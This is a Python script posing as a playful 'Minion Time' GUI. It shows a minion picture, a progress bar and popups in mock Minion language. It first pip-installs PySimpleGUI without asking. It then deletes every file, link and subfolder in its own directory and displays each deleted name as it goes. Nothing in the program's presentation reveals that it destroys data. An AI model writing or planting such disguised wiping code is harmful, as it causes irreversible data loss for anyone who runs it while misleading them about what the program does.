import os
import shutil
import subprocess
import sys
import importlib.util
import time
import platform

spec = importlib.util.find_spec("PySimpleGUI")
if spec is None:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "PySimpleGUI"])

import PySimpleGUI as sg

folder = os.path.dirname(os.path.abspath(__file__))
if platform.system() == "Windows":
    img_path = folder + "\\minion.png"
elif platform.system() == "Linux":
    img_path = folder + "/minion.png"

sg.theme('SystemDefaultForReal')
layout = [[sg.Text('Minion Time', font="Roboto, 50")],
          [sg.Image(f"{img_path}")],
          [sg.Text('Sad nomba:', font="Roboto, 16"), sg.Text('', key='-TEXT-', font="Roboto, 16")],
          [sg.ProgressBar(10000, orientation='h', size=(20, 20), key='progressbar')]]

window = sg.Window('Minion Time').Layout(layout)
progress_bar = window.find_element('progressbar')

countFiles = len(os.listdir(folder))
i = 1
for filename in os.listdir(folder):
    file_path = os.path.join(folder, filename)
    try:
        if os.path.isfile(file_path) or os.path.islink(file_path):
            os.unlink(file_path)
            pass
        elif os.path.isdir(file_path):
            shutil.rmtree(file_path)
            pass
    except Exception as e:
        sg.Popup('Ilkyen da adzmo, to sama vivo nunu muggey dia %s. Reason: %s' % (file_path, e))
    finally:
        event, values = window.Read(timeout=250)
        progress_bar.UpdateBar(int((i / countFiles) * 10000))
        i += 1
        window['-TEXT-'].update(filename)
sg.Popup('Tadda tu dim kaylay bem teepus')

time.sleep(5)
window.Close()


